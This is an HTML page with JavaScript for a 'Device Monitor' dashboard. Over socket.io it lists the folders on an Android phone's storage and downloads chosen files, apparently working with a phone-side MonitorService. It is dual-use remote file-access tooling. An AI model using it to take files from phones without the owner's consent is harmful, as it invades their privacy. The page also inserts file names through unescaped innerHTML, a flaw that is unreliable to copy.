<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Device Monitor</title>
    <script src="/socket.io/socket.io.js"></script>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #121212; color: #eee; margin: 20px; }
        .card { background: #1e1e1e; padding: 20px; border-radius: 10px; border: 1px solid #333; margin-bottom: 20px; }
        #file-list { 
            height: 300px; overflow-y: auto; background: #000; 
            padding: 10px; border-radius: 5px; font-family: monospace; 
        }
        .file-item { 
            padding: 8px; border-bottom: 1px solid #222; cursor: pointer; color: #3498db; 
        }
        .file-item:hover { background: #222; }
        .dir-item { color: #f1c40f; font-weight: bold; }
        button { background: #27ae60; color: white; border: none; padding: 10px; cursor: pointer; border-radius: 5px; }
    </style>
</head>
<body>
    <div class="card">
        <h3>File Explorer</h3>
        <p>Path: <span id="cur-path">/storage/emulated/0</span></p>
        <button onclick="goHome()">Go Home</button>
        <div id="file-list">Waiting for device to respond...</div>
    </div>

    <script>
        const socket = io();

        function goHome() {
            socket.emit('command', 'list-files:/storage/emulated/0');
        }

        // Listen for the file list from the phone
        socket.on('file-list', (jsonString) => {
            console.log("Displaying files...");
            const container = document.getElementById('file-list');
            container.innerHTML = '';
            
            try {
                // MonitorService.java emits a JSONArray string
                const files = JSON.parse(jsonString); 
                
                files.forEach(file => {
                    const div = document.createElement('div');
                    div.className = 'file-item ' + (file.isDir ? 'dir-item' : '');
                    div.innerHTML = (file.isDir ? "ðŸ“ " : "ðŸ“„ ") + file.name;
                    
                    div.onclick = () => {
                        if (file.isDir) {
                            document.getElementById('cur-path').innerText = file.path;
                            socket.emit('command', 'list-files:' + file.path);
                        } else {
                            if(confirm("Download " + file.name + "?")) {
                                socket.emit('command', 'download:' + file.path);
                            }
                        }
                    };
                    container.appendChild(div);
                });
            } catch (e) {
                container.innerText = "Error parsing file list: " + e;
            }
        });

        // Listen for actual file downloads
        socket.on('file-download-ready', (fileObj) => {
            const a = document.createElement('a');
            a.href = "data:application/octet-stream;base64," + fileObj.data;
            a.download = fileObj.name;
            a.click();
        });
    </script>
</body>
</html>
